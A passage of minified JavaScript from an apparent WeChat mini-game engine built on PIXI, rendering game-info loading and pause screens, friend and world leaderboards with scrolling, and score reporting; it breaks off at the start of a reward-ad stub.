            for (var n = this.runtimeData.getCloneListById(e).filter(function (t) {
                return (t = i.getSpriteById(t)) && t.renderer && t.renderer.visible && !t.renderer.noCollision;
            }), s = {}, r = (n.forEach(function (t) {
                s[t] = 1;
            }), this.collisionPairs[t]), a = 0; a < r.length; a++) if (s[r[a]]) return {
                result: !0,
                spriteID1: t,
                spriteID2: r[a]
            };
            return {
                result: !1
            };
        }
    }, {
        key: "checkAndGetAllChildren",
        value: function (t) {
            return t;
        }
    }]), e;
}(), defaultImage = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", base = "img", GameInfo$1 = function () {
    function i(t, e) {
        classCallCheck(this, i);
        try {
            this.PixelRatio = wxSystemInfo.pixelRatio;
        } catch (t) {
            this.PixelRatio = 2;
        }
        this.init(t, e);
    }
    return createClass(i, [{
        key: "init",
        value: function (t, e) {
            e && (this.PixelRatio = e), this.eventEmitter = getEventEmitter(), this.app = t,
                this.runtime = t.vm, this.open_game_info = {};
        }
    }, {
        key: "getLimitMsg",
        value: function (t) {
            var e = t.cur_game_beta_player_count || 1, i = t.max_game_beta_player_count || 100;
            return {
                tips: t.is_game_beta_player || 1 === this.open_game_info.release_type ? "访问限额：" + e + "/" + i : "访问限额：达到账号体验上限",
                exceed: !t.is_game_beta_player && 1 !== this.open_game_info.release_type
            };
        }
    }, {
        key: "resetInfo",
        value: function () {
            this.info && (this.info.removeChildren().forEach(function (t) {
                t.destroy({
                    baseTexture: !0
                });
            }), this.app.stage.removeChild(this.info), this.info = null), this.info = new PIXI__namespace.Container(),
                this.info.name = "game-info-page", this.app.stage.addChild(this.info);
        }
    }, {
        key: "infoShow",
        value: function () {
            this.resetInfo(), this.app.menuBtn.hide(), this.info.visible = !0, this.isInfoShowing = !0;
        }
    }, {
        key: "infoHide",
        value: function () {
            this.resetInfo(), this.app.menuBtn && this.app.menuBtn.show(), this.isInfoShowing = !1;
        }
    }, {
        key: "renderTips",
        value: function (t) {
            var e = new PIXI__namespace.Graphics();
            e.beginFill(16777215), e.drawRect(-this.app.gameWidth / 2, -this.app.gameHeight / 2, 2 * this.app.gameWidth, 2 * this.app.gameHeight),
                e.endFill(), this.container.addChild(e), (e = new PIXI__namespace.Sprite.from("img/144.png")).width = 50 * this.PixelRatio,
                e.height = 50 * this.PixelRatio, e.anchor.set(.5), e.x = 0, e.y = -90 * this.PixelRatio,
                this.container.addChild(e), (e = new PIXI__namespace.Text(t, {
                    align: "center",
                    fill: "#232323",
                    fontSize: 16 * this.PixelRatio
                })).anchor.set(.5), e.x = 0, e.y = -47 * this.PixelRatio, this.container.addChild(e);
        }
    }, {
        key: "loadAssets",
        value: function (t, i) {
            var n = this, e = new PIXI__namespace.Loader(), s = {
                loadType: PIXI__namespace.LoaderResource.LOAD_TYPE.IMAGE,
                xhrType: PIXI__namespace.LoaderResource.XHR_RESPONSE_TYPE.BLOB
            };
            e.add("logo", base + "/logo.png").add("screenshot", t.screenshot || defaultImage, s).add("button", base + "/button.png").add("reset_enable", base + "/reset_enable.png").add("test", base + "/test.png").add("share", base + "/share.png"),
                e.load(function (t, e) {
                    i && i(), n.app.renderStage(), n.hasLoadAssets = !0;
                });
        }
    }, {
        key: "release",
        value: function () {
            i.instance = null;
        }
    }, {
        key: "renderUI",
        value: function (t, e, i, n) {
            var s = e.meta_limit_info, r = 1 === e.release_type, s = this.getLimitMsg(s);
            this.renderBg(t), this.renderBox(e), this.renderGameText(e, s, r), this.renderPreviewLogo(r),
                this.renderShareBtn(t, r, e), this.renderStartBtn(t, s, n), this.rendererLoadingText(t),
                i && i();
        }
    }, {
        key: "renderBg",
        value: function (t) {
            var e = this.app.gameWidth, i = this.app.gameHeight, n = (Config.GAME_HEIGHT * this.PixelRatio > i && (i = Config.GAME_HEIGHT * this.PixelRatio * 1.2),
                Config.GAME_WIDTH * this.PixelRatio > e && (e = Config.GAME_WIDTH * this.PixelRatio * 1.2),
                new PIXI__namespace.Graphics());
            n.beginFill(2698034), n.drawRect(0, 0, e, i), n.endFill(), n.x = -e / 2, n.y = -i / 2,
                this.info.addChild(n), "loading" === t ? ((e = new PIXI__namespace.Sprite(PIXI__namespace.utils.TextureCache[base + "/logo.png"])).width = 144.5 * this.PixelRatio,
                    e.height = 20 * this.PixelRatio, e.x = -72 * this.PixelRatio, e.y = 278 * this.PixelRatio,
                    this.info.addChild(e)) : "pause" === t && (n.alpha = .9);
        }
    }, {
        key: "renderBox",
        value: function (t) {
            var e = new PIXI__namespace.Graphics();
            e.beginFill(0), e.drawRoundedRect(0, 0, 270 * this.PixelRatio, 480 * this.PixelRatio, 4 * this.PixelRatio),
                e.endFill(), e.x = -e.width / 2, e.y = -e.height / 1.65, this.info.addChild(e),
                e.name = "roundBox", (t = new PIXI__namespace.Sprite(PIXI__namespace.utils.TextureCache[t.screenshot])).width = 270 * this.PixelRatio,
                t.height = 270 * Config.GAME_HEIGHT / Config.GAME_WIDTH * this.PixelRatio, t.x = 0,
                t.y = 0, t.name = "screenshot", e.addChild(t), (t = new PIXI__namespace.Graphics()).beginFill(0),
                t.drawRect(0, 0, 270 * this.PixelRatio, 80 * this.PixelRatio), t.endFill(), t.x = 0,
                t.y = 401 * this.PixelRatio, e.addChild(t), this.top = t, this.roundBox = e;
        }
    }, {
        key: "renderGameText",
        value: function (t, e, i) {
            e = this.getAuthInfo(t, e, i), (i = new PIXI__namespace.Text(e, {
                align: "center",
                fill: "#ffffff",
                fontSize: 12 * this.PixelRatio
            })).anchor.set(.5), i.x = 270 * this.PixelRatio / 2, i.y = 55 * this.PixelRatio,
                this.authorLabel = i, this.top.addChild(i), (e = new PIXI__namespace.Text(t.project_name || "", {
                    align: "center",
                    fill: "#ffffff",
                    fontSize: 18 * this.PixelRatio
                })).anchor.set(.5), e.x = this.roundBox.width / 2, e.y = 18 * this.PixelRatio + e.height / 2,
                e.name = "game__name", this.nameLabel = e, this.top.addChild(e);
        }
    }, {
        key: "getAuthInfo",
        value: function (t, e, i) {
            var n = "作者：" + t.author_name || "无";
            return 1 != t.project_type || (i = i ? "仅限开发者访问" : e.tips, t.remote_version.is_public) ? n : n + " | " + i;
        }
    }, {
        key: "renderStartBtn",
        value: function (t, e, i) {
            var n = this, s = new PIXI__namespace.Sprite(PIXI__namespace.utils.TextureCache[base + "/button.png"]), r = (s.width = 140 * this.PixelRatio,
                s.height = 40 * this.PixelRatio, s.x = 65 * this.PixelRatio, s.y = 505 * this.PixelRatio,
                s.interactive = !0, this.roundBox.addChild(s), s.name = "start", new PIXI__namespace.Text("loading" === t ? "启动游戏" : "继续游戏", {
                    align: "center",
                    fill: "#000000",
                    fontSize: 16 * this.PixelRatio
                }));
            r.anchor.set(.5), r.x = s.width / this.PixelRatio, r.y = s.height / this.PixelRatio,
                r.scale.set(2 / this.PixelRatio), r.visible = !1, s.addChild(r), this.startText = r,
                s.on("pointerdown", function () {
                    "loading" !== t || e.exceed ? e.exceed ? wx.showToast({
                        title: "体验人数达到上限",
                        icon: "none",
                        duration: 2e3
                    }) : "pause" === t && (isMiniGame && mta && mta.Event.stat("info_click_go_on_game", {}),
                        setTimeout(function () {
                            n.infoHide();
                        }, 0), n.app.restartGame()) : (isMiniGame && mta && mta.Event.stat("info_click_start", {}),
                            n.app.loaderManager.resourcesLoadComplete && i && i());
                }), e.exceed && (s.alpha = .4), this.startBtn = s;
        }
    }, {
        key: "renderShareBtn",
        value: function (t, e, i) {
            var n;
            "pause" === t && (n = this, (t = new PIXI__namespace.Sprite(PIXI__namespace.utils.TextureCache[base + "/reset_enable.png"])).width = 40 * this.PixelRatio,
                t.height = 40 * this.PixelRatio, t.x = 0 * this.PixelRatio, t.y = 505 * this.PixelRatio,
                this.resetBtn = t, this.roundBox.addChild(t), t.interactive = !0, n.app.renderStage(),
                t.on("pointerdown", function () {
                    n.hasLoadAssets = !1, isMiniGame && mta && mta.Event.stat("info_click_refresh", {}),
                        n.runtime.reset(), n.infoHide(), n.runtime.status = !0;
                })), e || ((t = new PIXI__namespace.Sprite(PIXI__namespace.utils.TextureCache[base + "/share.png"])).interactive = !0,
                    t.width = 40 * this.PixelRatio, t.height = 40 * this.PixelRatio, t.x = 225 * this.PixelRatio,
                    t.y = 505 * this.PixelRatio, this.shareBtn = t, this.roundBox.addChild(t), t.on("pointerdown", function () {
                        isMiniGame && mta && mta.Event.stat("info_click_share", {}), wx.shareAppMessage({
                            title: i.share_title || i.project_name || "来玩个小游戏吧",
                            imageUrl: i.public_share_image_url || i.screenshot || "https://res.wx.qq.com/wechatgame/product/webpack/userupload/20200929/104614/share.jpg",
                            query: "from=gameinfo&scene=" + i.sceneId
                        });
                    }));
        }
    }, {
        key: "renderInfo",
        value: function (t, e, i) {
            var n = this, s = 3 < arguments.length && void 0 !== arguments[3] ? arguments[3] : "loading";
            this.infoShow(), t = t || this.open_game_info, this.open_game_info = t, this.hasLoadAssets ? this.renderUI(s, t, e, i) : this.loadAssets(t, function () {
                n.renderUI(s, t, e, i);
            }), "pause" === s && this.pauseGame();
        }
    }, {
        key: "pauseGame",
        value: function () {
            this.loadText.visible = !1, this.startText.visible = !0, this.app.pauseGame();
        }
    }, {
        key: "renderPreviewLogo",
        value: function (t) {
            t || ((t = new PIXI__namespace.Sprite(PIXI__namespace.utils.TextureCache[base + "/test.png"])).width = 60 * this.PixelRatio,
                t.height = 60 * this.PixelRatio, t.x = 0 * this.PixelRatio, t.y = 0 * this.PixelRatio,
                this.roundBox.addChild(t));
        }
    }, {
        key: "rendererLoadingText",
        value: function (t) {
            var e = new PIXI__namespace.Text("资源加载中 0%", {
                align: "center",
                fill: "#000000",
                fontSize: 14 * this.PixelRatio
            });
            e.anchor.set(.5), e.scale.set(2 / this.PixelRatio), e.x = this.startBtn.width / this.PixelRatio,
                e.y = this.startBtn.height / this.PixelRatio, e.name = "loadText", this.startBtn.addChild(e),
                this.loadText = e, "loading" !== t ? (this.loadText.visible = !1, this.startText.visible = !0) : (this.loadText.visible = !0,
                    this.startText.visible = !1);
        }
    }, {
        key: "setProgress",
        value: function (t) {
            this.loadText && (this.loadText.text = "资源加载中 " + t + "%", 100 <= t && (this.loadText.visible = !1,
                this.startText.visible = !0), this.app.renderStage());
        }
    }]), i;
}(), LandscapeGameInfo = function () {
    function s(t, e) {
        classCallCheck(this, s);
        var i = possibleConstructorReturn(this, (s.__proto__ || Object.getPrototypeOf(s)).call(this, t, e));
        return i.init(t, e), i;
    }
    return inherits(s, GameInfo$1), createClass(s, [{
        key: "renderBox",
        value: function (t) {
            var e = new PIXI__namespace.Graphics();
            e.beginFill(0), e.drawRoundedRect(0, 0, 480 * this.PixelRatio, 270 * this.PixelRatio, 4 * this.PixelRatio),
                e.endFill(), e.x = -e.width / 1.65, e.y = -e.height / 2, this.info.addChild(e),
                e.name = "roundBox", (t = new PIXI__namespace.Sprite(PIXI__namespace.utils.TextureCache[t.screenshot])).width = 480.24 * this.PixelRatio,
                t.height = 270 * this.PixelRatio, t.x = 0, t.y = 0, t.name = "screenshot", e.addChild(t),
                this.screenshot = t, (t = new PIXI__namespace.Graphics()).beginFill(0), t.drawRect(0, 0, 480 * this.PixelRatio, 80 * this.PixelRatio),
                t.endFill(), t.x = 0, t.y = 190 * this.PixelRatio, e.addChild(t), this.top = t,
                this.roundBox = e;
        }
    }, {
        key: "renderUI",
        value: function (t, e, i, n) {
            get(s.prototype.__proto__ || Object.getPrototypeOf(s.prototype), "renderUI", this).call(this, t, e, i, n),
                this.adjustPosition();
        }
    }, {
        key: "adjustPosition",
        value: function () {
            this.startBtn.x = this.screenshot.width - 20 * this.PixelRatio - this.startBtn.width,
                this.startBtn.y = this.screenshot.height - 20 * this.PixelRatio - this.startBtn.height,
                this.shareBtn && (this.shareBtn.x = 520 * this.PixelRatio, this.shareBtn.y = 165 * this.PixelRatio),
                this.resetBtn && (this.resetBtn.x = 520 * this.PixelRatio, this.resetBtn.y = 65 * this.PixelRatio);
        }
    }, {
        key: "renderGameText",
        value: function (t, e, i) {
            e = get(s.prototype.__proto__ || Object.getPrototypeOf(s.prototype), "getAuthInfo", this).call(this, t, e, i),
                (i = new PIXI__namespace.Text(e, {
                    fill: "#ffffff",
                    fontSize: 12 * this.PixelRatio
                })).x = 20 * this.PixelRatio, i.y = 238 * this.PixelRatio, this.roundBox.addChild(i),
                (e = new PIXI__namespace.Text(t.project_name || "", {
                    fill: "#ffffff",
                    fontSize: 18 * this.PixelRatio
                })).x = 20 * this.PixelRatio, e.y = 205 * this.PixelRatio, e.name = "game__name",
                this.roundBox.addChild(e), this.top.alpha = .5;
        }
    }]), s;
}(), GameInfo = function () {
    function i(t, e) {
        classCallCheck(this, i);
        try {
            this.PixelRatio = wxSystemInfo.pixelRatio;
        } catch (t) {
            this.PixelRatio = 2;
        }
        this.init(t, e);
    }
    return createClass(i, [{
        key: "init",
        value: function (t, e) {
            e && (this.PixelRatio = e), this.app = t, this.open_game_info = {}, this.infoShowing = !1;
        }
    }, {
        key: "resetInfo",
        value: function () {
            this.info && (this.info.removeChildren().forEach(function (t) {
                t.destroy({
                    baseTexture: !0
                });
            }), this.app.stage.removeChild(this.info), this.info = null), this.info = new PIXI__namespace.Container(),
                this.info.name = "game info page", this.app.stage.addChild(this.info);
        }
    }, {
        key: "infoShow",
        value: function () {
            this.resetInfo(), this.app.menuBtn && this.app.menuBtn.hide(), this.info.visible = !0,
                this.isInfoShowing = !0;
        }
    }, {
        key: "infoHide",
        value: function () {
            this.resetInfo(), this.app.menuBtn && this.app.menuBtn.show(), this.myReq && (window.cancelAnimationFrame(this.myReq),
                this.myReq = null), this.isInfoShowing = !1;
        }
    }, {
        key: "renderInfo",
        value: function (t, e, i) {
            this.startCbk = i, this.infoShow(), console.log("open_game_info", t), t = t || this.open_game_info;
            var i = (this.open_game_info = t).meta_limit_info, t = this.PixelRatio, n = new PIXI__namespace.Graphics();
            n.beginFill(16777215), n.drawRect(-this.app.gameWidth / 2, -this.app.gameHeight / 2, this.app.gameWidth, this.app.gameHeight),
                n.endFill(), this.info.addChild(n);
            (n = new PIXI__namespace.Sprite.from("img/back.png")).anchor.set(.5), n.scale.set(t / 2),
                this.info.addChild(n);
            var s = new PIXI__namespace.Sprite.from("img/qiu.png");
            s.anchor.set(.5), s.scale.set(t / 2), this.info.addChild(s), s.position.y = -10 * t / 2;
            (n = new PIXI__namespace.Sprite.from("img/front.png")).anchor.set(.5), n.scale.set(t / 2),
                this.info.addChild(n);
            var r = !1, a = this, o = -10 * t / 2, l = -100 * t / 2, h = l, u = new Date().getTime(), c = [];
            this.myReq = window.requestAnimationFrame(function t() {
                r ? o <= h ? (r = !1, u = new Date().getTime()) : (h += 30 * Math.pow((new Date().getTime() - u) / 1e3, 2) / 2,
                    c.push(h)) : h <= l || !c.length ? (r = !0, u = new Date().getTime()) : h = c.splice(-1, 1)[0] || 60,
                    s.position.y = h, s.rotation += .05, a.myReq = window.requestAnimationFrame(t);
            }), i && !i.is_game_beta_player ? wx.showToast({
                title: "体验人数达到上限",
                icon: "none",
                duration: 2e3
            }) : ((n = new PIXI__namespace.Sprite.from("img/logo1.png")).width = 145 * t, n.height = 20 * t,
                n.x = -75 * t, n.y = 270 * t, this.info.addChild(n), (i = new PIXI__namespace.Text("资源加载中...", {
                    align: "center",
                    fill: 0,
                    fontSize: 14 * t
                })).x = 0, i.y = 120 * t / 2, i.name = "loadText", this.info.addChild(i), i.x = -i.width / 2,
                this.loadText = i, e && e());
        }
    }, {
        key: "setProgress",
        value: function (t) {
            this.loadText && (this.loadText.text = "资源加载中 " + t + "%", this.app.renderStage());
        }
    }, {
        key: "release",
        value: function () {
            this.info.destroy(!0), i.instance = null;
        }
    }]), i;
}(), IDESubContext = function () {
    function e(t) {
        classCallCheck(this, e), this.init(t);
    }
    return createClass(e, [{
        key: "init",
        value: function (t) {
            this.app = t, this.stage = t.stage, this.ideFriendRankShow = !1;
        }
    }, {
        key: "removeInfo",
        value: function () {
            this.info && (this.info.removeChildren().forEach(function (t) {
                t.destroy({
                    baseTexture: !0
                });
            }), this.stage.removeChild(this.info), this.info = null, this.ideFriendRankShow = !1);
        }
    }, {
        key: "resetRankTips",
        value: function () {
            this.removeInfo(), this.info = new PIXI.Container(), this.info.name = "ide subContext",
                this.app.stage.addChild(this.info);
        }
    }, {
        key: "renderRankTips",
        value: function (t) {
            var e = this, i = (this.resetRankTips(), this.ideFriendRankShow = !0, new PIXI.Graphics());
            i.beginFill(0), i.drawRect(0, 0, 2 * this.app.gameWidth, 2 * this.app.gameHeight),
                i.endFill(), i.x = -this.app.gameWidth / 2, i.y = -this.app.gameHeight / 2, i.width = 2 * this.app.gameWidth,
                i.height = 2 * this.app.gameHeight, i.alpha = .8, i.interactive = !0, this.info.addChild(i),
                i.on("pointerdown", function () {
                    e.removeInfo();
                }), (i = new PIXI.Text(t || "排行榜组件请在手机端预览", {
                    align: "center",
                    fill: "#ffffff",
                    fontSize: 32
                })).anchor.set(.5), i.x = 0, i.y = i.height / 2, this.info.addChild(i), (t = new PIXI.Sprite.fromImage("https://wximg.qq.com/wxgame/luban/static/close.png", !0)).width = 80,
                t.height = 80, t.x = -t.width / 2, t.y = 504, t.interactive = !0, this.info.addChild(t),
                t.on("pointerdown", function () {
                    e.removeInfo();
                });
        }
    }]), e;
}(), postTypeMap = {
    init: -1,
    best: 0,
    friendRank: 2,
    groupRank: 3,
    report: 4,
    setTitle: 5,
    setUnit: 6,
    setSort: 7,
    setPeriod: 8,
    close: 9
}, cacheData = void 0, SubContext = function () {
    function t() {
        classCallCheck(this, t), this.gameid = "";
    }
    return createClass(t, [{
        key: "setRender",
        value: function (t) {
            this.renderer = t, this.stage = this.renderer.stage;
        }
    }, {
        key: "init",
        value: function (t, e) {
            this.setRender(t), this.ideSubContext = new IDESubContext(t), this.gameid = e && e.meta && e.meta.id,
                this.friendRankShow = !1, this.worldRankShow = !1, isMiniGame && (this.sys = t = wxSystemInfo,
                    this.openDataContext = wx.getOpenDataContext(), this.sharedCanvas = this.openDataContext.canvas,
                    this.sharedCanvas.width = Config.GAME_WIDTH * t.pixelRatio, this.sharedCanvas.height = Config.GAME_HEIGHT * t.pixelRatio,
                    this.time = 0, this.begin = 0, this.change = 100, this.duration = -1, this._scrolling = !1,
                    this.speed = 0, this.worldRankHeight = 384 * (t ? t.pixelRatio : 2), "lbZmVkMWYwYTYtNjliMy00MGY5LTkwYWItZjJhZmQzNGU2YWE4" === this.gameid && window.GameGlobal && window.GameGlobal.gettoprank(96750, function (t) {
                        cacheData = t;
                    }), this.openDataContext.postMessage({
                        postType: postTypeMap.init,
                        gameid: this.gameid
                    }));
        }
    }, {
        key: "preFriendRank",
        value: function () {
            this.friendRankShow || (this.openDataContext.postMessage({
                postType: postTypeMap.friendRank,
                gameid: this.gameid
            }), this.friendRankShow = !0);
        }
    }, {
        key: "renderWorldRank",
        value: function (t) {
            if (this.worldRankVisible) {
                var e, i, n, s, r, a, o, l, h, u, c, p, d, g, f, m, y = this.sys ? this.sys.pixelRatio : 2, _ = 328 * y, v = 64 * y, k = 16 * y * 2;
                if (this.worldRankShow) return t && t !== cacheData ? (cacheData = t, this._rankList.destroy(),
                    this._rankList = this.renderWorldList(t.rank_list, _, v, k, y), this._rankListContainer.addChild(this._rankList),
                    this._rankSelf.destroy(), this._rankSelf = this.renderRankItem(t.self_rank, 0, !0, _, v, k, y),
                    void this._rankSelfContainer.addChild(this._rankSelf)) : void 0;
                (t || cacheData) && (t ? cacheData = t : t = cacheData, this.worldRankShow = !0,
                    n = this.renderer.gameWidth, a = this.renderer.gameHeight, o = -300 * y, Config.GAME_HEIGHT * y > a && (a = Config.GAME_HEIGHT * y),
                    Config.GAME_WIDTH * y > n && (n = Config.GAME_WIDTH * y), e = new PIXI__namespace.Container(),
                    (i = new PIXI__namespace.Graphics()).beginFill(4107804), i.drawRect(0, 0, n, a),
                    i.endFill(), i.x = -n / 2, i.y = -a / 2, i.interactive = !0, n = o, s = new PIXI__namespace.Sprite.from("https://gamemaker.qpic.cn/luban/1_32386234303137372d646433392d346639352d623862372d623062386362343535396632"),
                    r = new PIXI__namespace.Sprite.from("https://gamemaker.qpic.cn/luban/1_61636434313631322d616432662d343338622d613165392d386537313432316538326664"),
                    s.width = 143 * y, s.height = 46 * y, s.y = n + 24 * y, s.anchor.set(.5), n += 46 * y + 28 * y,
                    a = t.rank_list, o = t.self_rank, this._rankListContainer = new PIXI__namespace.Container(),
                    l = new PIXI__namespace.Container(), (h = new PIXI__namespace.Graphics()).lineStyle(0),
                    h.beginFill(16777215, 1), h.drawRoundedRect(0, 0, _, 6 * v, 8 * y), h.endFill(),
                    (u = new PIXI__namespace.Graphics()).lineStyle(0), u.beginFill(16777215, 1), u.drawRoundedRect(0, 0, _, 6 * v, 8 * y),
                    u.endFill(), this._rankList = this.renderWorldList(a, _, v, k, y), this._rankListContainer.addChild(this._rankList),
                    l.addChild(u, this._rankListContainer, h), l.x = -_ / 2, l.y = n, l.mask = h, n += 6 * v + 8 * y,
                    this._rankSelfContainer = new PIXI__namespace.Container(), this._rankSelfContainer.x = -_ / 2,
                    this._rankSelfContainer.y = n, this._rankSelf = this.renderRankItem(o, 0, !0, _, v, k, y),
                    this._rankSelfContainer.addChild(this._rankSelf), n += v + 40 * y, r.width = 64 * y,
                    r.height = 44 * y, r.x = -r.width / 2, r.y = n, r.interactive = !0, e.addChild(i, s, l, this._rankSelfContainer, r),
                    this.stage.addChild(e), c = this, r.on("pointerdown", function () {
                        c.worldRankVisible = !1, c.worldRankShow = !1, c.renderer.stage.removeChild(e),
                            i.destroy(), r.destroy(), s.destroy(), c._rankList.destroy(), c._rankSelf.destroy(),
                            u.destroy(), l.destroy(), h.destroy(), e.destroy(), c._rankList = null, i = r = null;
                    }), f = v, m = (-Math.max(0, a.length - 6) - 1) * v, l.interactive = !0, l.on("pointerdown", function (t) {
                        this.speed = 0, p = Date.now(), d = t.data.getLocalPosition(l.parent), g = this._rankList.position.y;
                    }, this), l.on("pointermove", function (t) {
                        d && (this._scrolling = !0, t = t.data.getLocalPosition(l.parent).y - d.y, 0 !== Math.round(t)) && (t = g + t,
                            t = Math.min(t, f), t = Math.max(t, m), this._rankList.y = t);
                    }, this), l.on("pointerup", function (t) {
                        b.call(this, t);
                    }, this), l.on("pointerout", function (t) {
                        b.call(this, t);
                    }, this), l.on("pointerupoutside", function (t) {
                        b.call(this, t);
                    }, this));
            }
            function b(t) {
                d && (t = t.data.getLocalPosition(l.parent), this.speed = (t.y - d.y) / (Date.now() - p) * 16,
                    d = null);
            }
        }
    }, {
        key: "renderRankItem",
        value: function (t, e, i, n, s, r, a) {
            var o, l, h = new PIXI__namespace.Container(), u = new PIXI__namespace.Graphics();
            return u.beginFill(e % 2 == 0 ? 16777215 : 15856885, 1), i ? u.drawRoundedRect(0, 0, n, s, 8 * a) : u.drawRect(0, 0, n, s),
                u.endFill(), t ? (i = new PIXI__namespace.Sprite.from(t.headimgurl + "/0"), o = new PIXI__namespace.Text(t.rank, new PIXI__namespace.TextStyle({
                    align: "center",
                    fontFamily: "Microsoft YaHei",
                    fontSize: r,
                    fill: t.rank <= 3 ? "#FF3E3E" : "#B3B3B3",
                    breakWords: !1,
                    wordWrap: !1
                })), l = new PIXI__namespace.Text(t.nickname, new PIXI__namespace.TextStyle({
                    fontFamily: "Microsoft YaHei",
                    fontSize: r,
                    fill: "#151E45",
                    breakWords: !1,
                    wordWrap: !1
                })), t = new PIXI__namespace.Text(t.score, new PIXI__namespace.TextStyle({
                    align: "right",
                    fontFamily: "Microsoft YaHei",
                    fontSize: r / 2 * 3,
                    fill: "#3EAE1C",
                    breakWords: !1,
                    wordWrap: !1
                })), i.width = 32 * a, i.height = 32 * a, o.anchor.set(.5), l.anchor.set(0, .5),
                    t.anchor.set(0, .5), o.scale.set(.5), l.scale.set(.5), t.scale.set(.5), o.position.set(20 * a, s / 2),
                    i.position.set(40 * a, 16 * a), l.position.set(84 * a, s / 2), t.position.set(n - 24 * a - t.width, s / 2),
                    h.addChild(u, o, i, l, t)) : h.addChild(u), h.position.y = e * s, h;
        }
    }, {
        key: "renderWorldList",
        value: function (t, e, i, n, s) {
            for (var r = new PIXI__namespace.Container(), a = Math.max(6, t.length), o = 0; o < a; o++) {
                var l = t[o], l = this.renderRankItem(l, o, 0, e, i, n, s);
                r.addChild(l);
            }
            return r;
        }
    }, {
        key: "clearFriendRank",
        value: function () {
            var t = this.stage.getChildByName("shared");
            t && this.stage.removeChild(t), (t = this.stage.getChildByName("friendRankClose")) && this.stage.removeChild(t),
                (t = this.stage.getChildByName("friendRankBg")) && this.stage.removeChild(t);
        }
    }, {
        key: "renderFriendRank",
        value: function () {
            var t = this.renderer.gameWidth, e = this.renderer.gameHeight, i = this.sys.pixelRatio, n = (Config.GAME_HEIGHT * i > e && (e = Config.GAME_HEIGHT * i),
                Config.GAME_WIDTH * i > t && (t = Config.GAME_WIDTH * i), new PIXI__namespace.Graphics());
            n.beginFill(0), n.drawRect(0, 0, t, e), n.endFill(), n.x = -t / 2, n.y = -e / 2,
                n.alpha = .8, n.name = "friendRankBg", n.interactive = !0, this.stage.addChild(n),
                (t = PIXI__namespace.Texture.fromCanvas(this.sharedCanvas)).update();
            (e = new PIXI__namespace.Sprite(t)).name = "shared", e.anchor.set(.5), e.scale.set(1 / this.stage.scale.x),
                this.stage.addChild(e);
            var s = new PIXI__namespace.Sprite.from("img/close.png"), r = (s.width = 40 * i,
                s.height = 40 * i, Config.horizontal ? (s.x = 200 * i - s.width / 2, s.y = 0) : (s.x = -s.width / 2,
                    s.y = 230 * i), s.interactive = !0, this.stage.addChild(s), this);
            s.on("pointerdown", function () {
                r.friendRankShow = !1, r.openDataContext.postMessage({
                    postType: postTypeMap.close,
                    gameid: r.gameid
                }), n.destroy(), s.destroy(), r.renderer.stage.removeChild(s), r.renderer.stage.removeChild(n),
                    n = s = null, isMiniGame && mta && mta.Event.stat("rank_close", {});
            }), s.name = "friendRankClose";
        }
    }, {
        key: "reportScore",
        value: function (t) {
            isMiniGame && this.openDataContext && (isMiniGame && mta && mta.Event.stat("home_report_score", {
                score: t
            }), this.openDataContext.postMessage({
                postType: postTypeMap.report,
                gameid: this.gameid,
                score: t
            }), "lbZmVkMWYwYTYtNjliMy00MGY5LTkwYWItZjJhZmQzNGU2YWE4" === this.gameid) && window.GameGlobal && window.GameGlobal.updateleaderboard(96750, t);
        }
    }, {
        key: "showRank",
        value: function () {
            isMiniGame ? (mta && mta.Event.stat("home_click_to_show_rank", {}), "lbZmVkMWYwYTYtNjliMy00MGY5LTkwYWItZjJhZmQzNGU2YWE4" === this.gameid && window.GameGlobal ? (this.worldRankVisible = !0,
                this.renderWorldRank(), window.GameGlobal.gettoprank(96750, this.renderWorldRank.bind(this))) : this.preFriendRank()) : this.ideSubContext.renderRankTips("排行榜组件请在手机端预览");
        }
    }, {
        key: "setRankTitle",
        value: function (t) {
            isMiniGame && this.openDataContext && this.openDataContext.postMessage({
                postType: postTypeMap.setTitle,
                gameid: this.gameid,
                value: t
            });
        }
    }, {
        key: "setRankUnit",
        value: function (t) {
            isMiniGame && this.openDataContext && this.openDataContext.postMessage({
                postType: postTypeMap.setUnit,
                gameid: this.gameid,
                value: t
            });
        }
    }, {
        key: "setRankSort",
        value: function (t) {
            isMiniGame && this.openDataContext && this.openDataContext.postMessage({
                postType: postTypeMap.setSort,
                gameid: this.gameid,
                value: t
            });
        }
    }, {
        key: "setRankPeriod",
        value: function (t) {
            isMiniGame && this.openDataContext && this.openDataContext.postMessage({
                postType: postTypeMap.setPeriod,
                gameid: this.gameid,
                value: t
            });
        }
    }, {
        key: "easeOut",
        value: function (t, e, i, n, s) {
            return i * ((t = t / n - 1) * t * (((s = void 0 === s ? 1.70158 : s) + 1) * t + s) + 1) + e;
        }
    }, {
        key: "update",
        value: function () {
            var t;
            this.clearFriendRank(), this.sharedCanvas && this.friendRankShow && this.renderFriendRank(),
                this.worldRankShow && this._rankList && (this.time <= this.duration && (t = this.easeOut(this.time, this.begin, this.change, this.duration),
                    this.time++, this._rankList.y = t), t = Math.min(Math.abs(this.speed) / 32, 1),
                    1 < this.speed ? this.speed -= t : this.speed < -1 ? this.speed += t : this.speed = 0,
                    0 !== this.speed) && this._scrolling && (t = this.worldRankHeight - this._rankList.height,
                        t = Math.round(Math.min(0, t)), this._rankList.y < t ? (this._scrolling = !1, this.time = 0,
                            this.begin = this._rankList.y, this.change = t - this._rankList.y, this.duration = 20) : 0 < this._rankList.y ? (this._scrolling = !1,
                                this.time = 0, this.begin = this._rankList.y, this.change = -this._rankList.y, this.duration = 20) : (this._scrolling = !0,
                                    this._rankList.y += Math.round(this.speed)));
        }
    }]), t;
}(), subContext = new SubContext(), eventEmitter = getEventEmitter(), IDERewardAd = function () {
    function e(t) {
        classCallCheck(this, e);
        try {
            this.PixelRatio = wxSystemInfo.pixelRatio;
        } catch (t) {
            this.PixelRatio = 2;
        }
        this.init(t);
    }
    return createClass(e, [{
        key: "init",
        value: function (t) {
            this.app = t, this.stage = t.stage, this.ideShow = !1;
        }
    }, {
        key: "removeInfo",
        value: function () {
            this.info && (this.info.removeChildren().forEach(function (t) {
                t.destroy({
                    baseTexture: !0
                });
            }), this.stage.removeChild(this.info), this.info = null, this.ideShow = !1);
        }
    }, {
        key: "resetRankTips",
        value: function () {
            this.removeInfo(), this.info = new PIXI__namespace.Container(), this.info.name = "ide subContext",
                this.app.stage.addChild(this.info);
        }
    }, {
        key: "show",
        value: function (t) {
            var e = this, i = (this.resetRankTips(), this.ideShow = !0, new PIXI__namespace.Graphics());
